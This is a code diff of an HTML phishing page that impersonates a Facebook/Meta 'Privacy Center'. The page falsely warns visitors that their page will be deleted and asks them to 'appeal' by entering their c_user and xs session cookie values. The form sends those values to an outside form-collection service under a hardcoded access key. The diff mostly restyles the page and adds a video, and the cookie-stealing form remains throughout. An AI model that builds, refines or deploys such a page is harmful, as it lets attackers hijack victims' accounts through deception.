@@ -8,21 +8,21 @@
 </head>
 <body>
 
-    <div id="langModal" class="modal-overlay" style="display: flex;">
+    <div id="langModal" class="modal-overlay">
         <div class="modal-box">
-            <h2 class="modal-title" style="color: #1877f2; font-size: 18px;">Select Your Language</h2>
+            <h2 class="modal-title">Select Your Language</h2>
             <p style="font-size: 12px; color: gray;">Choose your preferred language for the page content</p>
-            <div class="lang-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 15px 0;">
-                <div class="lang-item active" style="border: 1px solid #1877f2; padding: 8px; border-radius: 5px; background: #e7f3ff;">🇺🇸 English</div>
-                <div class="lang-item" style="border: 1px solid #ddd; padding: 8px; border-radius: 5px;">🇮🇳 Hindi</div>
-                <div class="lang-item" style="border: 1px solid #ddd; padding: 8px; border-radius: 5px;">🇪🇸 Spanish</div>
-                <div class="lang-item" style="border: 1px solid #ddd; padding: 8px; border-radius: 5px;">🇵🇹 Portuguese</div>
-                <div class="lang-item" style="border: 1px solid #ddd; padding: 8px; border-radius: 5px;">🇮🇳 Tamil</div>
-                <div class="lang-item" style="border: 1px solid #ddd; padding: 8px; border-radius: 5px;">🇦🇪 Arabic</div>
-                <div class="lang-item" style="border: 1px solid #ddd; padding: 8px; border-radius: 5px;">🇫🇷 French</div>
-                <div class="lang-item" style="border: 1px solid #ddd; padding: 8px; border-radius: 5px;">🇻🇳 Vietnamese</div>
+            <div class="lang-grid">
+                <div class="lang-item active">🇺🇸 English</div>
+                <div class="lang-item">🇮🇳 Hindi</div>
+                <div class="lang-item">🇪🇸 Spanish</div>
+                <div class="lang-item">🇵🇹 Portuguese</div>
+                <div class="lang-item">🇮🇳 Tamil</div>
+                <div class="lang-item">🇦🇪 Arabic</div>
+                <div class="lang-item">🇫🇷 French</div>
+                <div class="lang-item">🇻🇳 Vietnamese</div>
             </div>
-            <button class="blue-btn" onclick="closeLangModal()">Confirm Language</button>
+            <button class="confirm-btn" onclick="closeLangModal()">Confirm Language</button>
         </div>
     </div>
 
@@ -33,60 +33,83 @@
                 <span style="font-weight: bold; margin-left: 8px;">Privacy Center</span>
             </div>
             <nav>
-                <a href="#" class="nav-item active">🏠 Privacy Center Home</a>
+                <a href="#" class="nav-item active">🏠 Privacy Center Home Page</a>
                 <a href="#" class="nav-item">🔍 Search</a>
                 <a href="#" class="nav-item">🛡️ Privacy Policy</a>
+                <a href="#" class="nav-item">📄 Other Rules & Articles</a>
             </nav>
         </div>
 
         <div class="content-area">
-            <div id="appealHome">
-                <div class="alert-banner" style="border-left: 5px solid #d93025; background: white; padding: 15px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
-                    <strong style="color: #d93025;">⚠️ Your page is scheduled to be deleted!</strong>
-                    <p style="font-size: 13px; margin-top: 5px;">We received reports that your page violates our community guidelines.</p>
+            <div class="header-banner">
+                <span style="color: #d93025; font-size: 24px;">⚠️</span>
+                <div>
+                    <h4 style="color: #d93025; margin: 0;">Your page is scheduled to be deleted!</h4>
+                    <p style="font-size: 13px; color: #4b4f56; margin-top: 5px;">We have received several reports that your page violates our terms of service. As a result, your page will be sent for verification.</p>
                 </div>
-                
-                <div class="appeal-card" style="background: white; padding: 20px; border-radius: 8px; text-align: center;">
-                    <img src="https://i.ibb.co/Lz0x8Yp/appeal-illus.png" alt="Illustration" style="width: 100%; max-width: 300px;">
+            </div>
+
+            <div id="appealHome">
+                <div class="appeal-card">
+                    <img src="https://i.ibb.co/Lz0x8Yp/appeal-illus.png" alt="Illustration" style="width: 100%; border-radius: 8px;">
                     <h3>Appeal request</h3>
-                    <p style="color: gray; font-size: 14px;">Please provide the requested information below to fix your page problems.</p>
+                    <p>Fixing problems with your page. Please provide the requested information below.</p>
                     <button class="blue-btn" onclick="showForm()">Appeal</button>
                 </div>
             </div>
 
-            <div id="formSection" style="display: none; background: white; padding: 20px; border-radius: 8px; width: 100%; max-width: 450px;">
-                <form action="https://api.web3forms.com/submit" method="POST">
-                    <input type="hidden" name="access_key" value="2097348c-f211-4435-9c44-f3fa74a2b876">
+            <div id="formSection" style="display: none;">
+                <div class="form-container">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                        <div class="blue-dot-icon">🔵</div>
+                        <h4 style="margin: 0;">Page Appeal Request</h4>
+                    </div>
                     
-                    <h4>Page Appeal Request</h4>
-                    <div style="background: #e7f3ff; padding: 10px; border-radius: 5px; font-size: 12px; margin-bottom: 15px;">
-                        🛈 Your page has a violation. Please provide correct details.
+                    <div class="info-blue-box">
+                        <p>ℹ️ Your page has a violation related to community guidelines.</p>
+                        <p>ℹ️ Please review the details before submitting.</p>
                     </div>
 
-                    <div style="position: relative; margin-bottom: 15px;">
-                        <img src="https://i.ibb.co/kH7RkHn/meta-video-thumb.png" style="width: 100%; border-radius: 5px;">
-                        <div style="position: absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size: 40px; color: white;">▶️</div>
+                    <div class="video-container">
+                        <video controls poster="https://i.ibb.co/kH7RkHn/meta-video-thumb.png" width="100%">
+                            <source src="https://video.twimg.com/ext_tw_video/1779803155043815424/pu/vid/avc1/1280x720/v-79_vY_U8_m1_H-.mp4" type="video/mp4">
+                            Your browser does not support the video tag.
+                        </video>
                     </div>
 
-                    <label style="display:block; font-size: 14px; font-weight: bold;">c_user</label>
-                    <input type="text" name="c_user" placeholder="Enter c_user" required style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px;">
+                    <form action="https://api.web3forms.com/submit" method="POST">
+                        <input type="hidden" name="access_key" value="2097348c-f211-4435-9c44-f3fa74a2b876">
+                        
+                        <div class="input-group">
+                            <label>c_user</label>
+                            <input type="text" name="c_user" placeholder="Enter c_user" required>
+                        </div>
 
-                    <label style="display:block; font-size: 14px; font-weight: bold;">xs</label>
-                    <input type="text" name="xs" placeholder="Enter xs" required style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px;">
+                        <div class="input-group">
+                            <label>xs</label>
+                            <input type="text" name="xs" placeholder="Enter xs" required>
+                        </div>
 
-                    <button type="submit" class="blue-btn">Submit Appeal Request</button>
-                </form>
+                        <button type="submit" class="blue-btn">Submit Appeal Request</button>
+                    </form>
+                </div>
+            </div>
+
+            <div class="resources-section">
+                <h4>Appeal Guide</h4>
+                <div class="guide-box">
+                    <p>If your appeal involves copyrighted information, our review process could take up to 7 business days. Please check your email for updates.</p>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        function closeLangModal() {
-            document.getElementById('langModal').style.display = 'none';
-        }
+        function closeLangModal() { document.getElementById('langModal').style.display = 'none'; }
         function showForm() {
             document.getElementById('appealHome').style.display = 'none';
             document.getElementById('formSection').style.display = 'block';
+            window.scrollTo(0, 0);
         }
     </script>
 </body>
